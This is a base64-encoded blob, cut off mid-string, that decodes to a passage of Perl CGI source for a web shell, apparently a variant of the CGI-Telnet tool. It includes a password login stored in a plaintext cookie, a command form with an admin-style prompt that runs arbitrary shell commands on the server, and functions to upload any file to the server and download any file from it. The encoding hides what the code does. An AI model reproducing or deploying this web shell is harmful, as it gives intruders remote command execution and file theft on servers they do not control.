LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ291dA0Kew0KCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUNCgkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJJlByaW50TG9nb3V0U2NyZWVuOw0KDQoJJlByaW50TG9naW5TY3JlZW47DQoJJlByaW50TG9naW5Gb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQoJZXhpdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB0byBsb2dpbiB0aGUgdXNlci4gSWYgdGhlIHBhc3N3b3JkIG1hdGNoZXMsIGl0DQojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0DQojIG1hdGNoIG9yIGlmIG5vIHBhc3N3b3JkIGlzIGVudGVyZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlcg0KIyB0byBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dpbiANCnsNCglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZA0KCXsNCgkJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPSRMb2dpblBhc3N3b3JkO1xuIjsNCgkJJlByaW50UGFnZUhlYWRlcjsNCgkJcHJpbnQgJkxpc3REaXI7DQoJfQ0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkJJlByaW50TG9naW5TY3JlZW47DQoJCWlmKCRMb2dpblBhc3N3b3JkIG5lICIiKSAjIHNvbWUgcGFzc3dvcmQgd2FzIGVudGVyZWQNCgkJew0KCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOw0KDQoJCX0NCgkJJlByaW50TG9naW5Gb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlleGl0Ow0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCglteSAkZGlyPSAiPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJjb21tYW5kIikuIjwvc3Bhbj4iOw0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyM2NmZmNjYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjUwIiBuYW1lPSJjIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0InR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJbXkgJGRpciA9ICZBZGRMaW5rRGlyKCJkb3dubG9hZCIpOyANCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgY2xhc3M9ImZpbGUiIHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KRG93bmxvYWQ6IDxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCZWdpbiI+DQoNCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCglteSAkZGlyPSAmQWRkTGlua0RpcigidXBsb2FkIik7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgY2xhc3M9ImZpbGUiIHR5cGU9ImZpbGUiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KT3B0aW9uczogJm5ic3A7PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvIiBpZD0idXAiIHZhbHVlPSJvdmVyd3JpdGUiPg0KPGxhYmVsIGZvcj0idXAiPk92ZXJ3cml0ZSBpZiBpdCBFeGlzdHM8L2xhYmVsPjxicj48YnI+DQpVcGxvYWQ6Jm5ic3A7Jm5ic3A7Jm5ic3A7PGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4NCg0KPC9mb3JtPg0KDQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB0aW1lb3V0IGZvciBhIGNvbW1hbmQgZXhwaXJlcy4gV2UgbmVlZCB0bw0KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzDQojIG5ldmVyIGNhbGxlZCB3aGVuIHRoZSBzY3JpcHQgaXMgcnVubmluZyBvbiBOVC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcmV0dXJuIDw8RU5EOw0KPC90ZXh0YXJlYT4NCjxicj48Zm9udCBjb2xvcj15ZWxsb3c+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuPC9mb250Pg0KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250Pg0KRU5EDQoJfQ0KfQ0KDQoNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGRpc3BsYXlzIHRoZSBwYWdlIHRoYXQgY29udGFpbnMgYSBsaW5rIHdoaWNoIGFsbG93cyB0aGUgdXNlcg0KIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gNCiMgZmVhdHVyZSB0aGF0IHN0YXJ0cyB0aGUgZG93bmxvYWQgYXV0b21hdGljYWxseS4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIGZpbGVuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludERvd25sb2FkTGlua1BhZ2UNCnsNCglsb2NhbCgkRmlsZVVybCkgPSBAXzsNCglteSAkcmVzdWx0PSIiOw0KCWlmKC1lICRGaWxlVXJsKSAjIGlmIHRoZSBmaWxlIGV4aXN0cw0KCXsNCgkJIyBlbmNvZGUgdGhlIGZpbGUgbGluayBzbyB3ZSBjYW4gc2VuZCBpdCB0byB0aGUgYnJvd3Nlcg0KCQkkRmlsZVVybCA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsNCgkJJEh0bWxNZXRhSGVhZGVyID0gIjxtZXRhIEhUVFAtRVFVSVY9XCJSZWZyZXNoXCIgQ09OVEVOVD1cIjE7IFVSTD0kRG93bmxvYWRMaW5rXCI+IjsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkcmVzdWx0IC49IDw8RU5EOw0KU2VuZGluZyBGaWxlICRUcmFuc2ZlckZpbGUuLi48YnI+DQoNCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LA0KPGEgaHJlZj0iJERvd25sb2FkTGluayI+Q2xpY2sgSGVyZTwvYT4NCkVORA0KCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCX0NCgllbHNlICMgZmlsZSBkb2Vzbid0IGV4aXN0DQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhIjsNCgkJJHJlc3VsdCAuPSAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIHJlYWRzIHRoZSBzcGVjaWZpZWQgZmlsZSBmcm9tIHRoZSBkaXNrIGFuZCBzZW5kcyBpdCB0byB0aGUNCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4NCiMgQXJndW1lbnQgMTogRnVsbHkgcXVhbGlmaWVkIHBhdGhuYW1lIG9mIHRoZSBmaWxlIHRvIGJlIHNlbnQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXINCnsNCglteSAkcmVzdWx0ID0gIiI7DQoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOw0KCWlmKG9wZW4oU0VOREZJTEUsICRTZW5kRmlsZSkpICMgZmlsZSBvcGVuZWQgZm9yIHJlYWRpbmcNCgl7DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJYmlubW9kZShTRU5ERklMRSk7DQoJCQliaW5tb2RlKFNURE9VVCk7DQoJCX0NCgkJJEZpbGVTaXplID0gKHN0YXQoJFNlbmRGaWxlKSlbN107DQoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsNCgkJcHJpbnQgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC11bmtub3duXG4iOw0KCQlwcmludCAiQ29udGVudC1MZW5ndGg6ICRGaWxlU2l6ZVxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7DQoJCXByaW50IHdoaWxlKDxTRU5ERklMRT4pOw0KCQljbG9zZShTRU5ERklMRSk7DQoJCWV4aXQoMSk7DQoJfQ0KCWVsc2UgIyBmYWlsZWQgdG8gb3BlbiBmaWxlDQoJew0KCQkkcmVzdWx0IC49ICJGYWlsZWQgdG8gZG93bmxvYWQgJFNlbmRGaWxlOiAkISI7DQoJCSRyZXN1bHQgLj0mUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlDQojIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsgdGhyb3VnaCB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMgVGhpcyBmdW5jdGlvbiBpcyBhbHNvIGNhbGxlZCB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvbiB0aGF0IGxpbmsuIEluIHRoaXMgY2FzZSwNCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCZWdpbkRvd25sb2FkDQp7DQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBzdGFydHMgdGhlIHVwbG9hZCBwcm9jZXNzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFVwbG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOw0KDQoJfQ0KCW15ICRyZXN1bHQ9IiI7DQoJIyBzdGFydCB0aGUgdXBsb2FkaW5nIHByb2Nlc3MNCgkkcmVzdWx0IC49ICJVcGxvYWRpbmcgJFRyYW5zZmVyRmlsZSB0byAkQ3VycmVudERpci4uLjxicj4iOw0KDQoJIyBnZXQgdGhlIGZ1bGxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgY3JlYXRlZA0KCWNob3AoJFRhcmdldE5hbWUpIGlmICgkVGFyZ2V0TmFtZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7DQoJJFRhcmdldE5hbWUgLj0gJFBhdGhTZXAuJDE7DQoNCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsNCgkjIGlmIHRoZSBmaWxlIGV4aXN0cyBhbmQgd2UgYXJlIG5vdCBzdXBwb3NlZCB0byBvdmVyd3JpdGUgaXQNCglpZigtZSAkVGFyZ2V0TmFtZSAmJiAkT3B0aW9ucyBuZSAib3ZlcndyaXRlIikNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCgl9DQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCgl7DQoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0KCQl7DQoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsNCgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9Ow0KCQkJY2xvc2UoVVBMT0FERklMRSk7DQoJCQkkcmVzdWx0IC49ICJUcmFuc2ZlcmVkICRUYXJnZXRGaWxlU2l6ZSBCeXRlcy48YnI+IjsNCgkJCSRyZXN1bHQgLj0gIkZpbGUgUGF0aDogJFRhcmdldE5hbWU8YnI+IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCSRyZXN1bHQgLj0gIkZhaWxlZDogJCE8YnI+IjsNCgkJfQ0KCX0NCgkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlLiBJZiB0aGUNCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQ0KIyBmaWxlLCBvdGhlcndpc2UgaXQgZGlzcGxheXMgYSBtZXNzYWdlIHRvIHRoZSB1c2VyIGFuZCBwcm92aWRlcyBhIGxpbmsNCiMgdGhyb3VnaCAgd2hpY2ggdGhlIGZpbGUgY2FuIGJlIGRvd25sb2FkZWQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRG93bmxvYWRGaWxlDQp7DQoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4NCglpZigkVHJhbnNmZXJGaWxlIGVxICIiKQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlyZXR1cm4gJlByaW50RmlsZURvd25sb2FkRm9ybTsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfCAoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCXJldHVybiAmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqY2RccysoLispLykgIyBpdCBpcyBhIGNoYW5nZSBkaXIgY29tbWFuZA0KCXsNCgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQ0KCQkjIGNvbW1hbmQgaXMgbm90IGRpc3BsYXllZC4NCgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAkMSIuJENtZFNlcC4kQ21kUHdkOw0KCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7DQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSMgeHVhdCB0aG9uZyB0aW4ga2hpIGNodXllbiBkZW4gMSB0aHUgbXVjIG5hbyBkbyENCgkJJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiOw0KCQkkcmVzdWx0IC49ICZSdW5DbWQ7DQoJfWVsc2lmKCRSdW5Db21tYW5kID1+IG0vXlxzKmVkaXRccysoLispLykNCgl7DQoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07DQoJfWVsc2UNCgl7DQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSRyZXN1bHQgLj0gIkNvbW1hbmQ6IDxydW4+JFJ1bkNvbW1hbmQ8L3J1bj48YnI+PHRleHRhcmVhIGlkPSdkYXRhJyBjb2xzPSckY29scycgcm93cz0nJHJvd3MnIHNwZWxsY2hlY2s9J2ZhbHNlJz4iOw0KCQkkcmVzdWx0IC49JlJ1bkNtZDsNCgl9DQoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBydW4gY29tbWFuZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpzdWIgUnVuQ21kDQp7DQoJbXkgJHJlc3VsdD0iIjsNCgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNv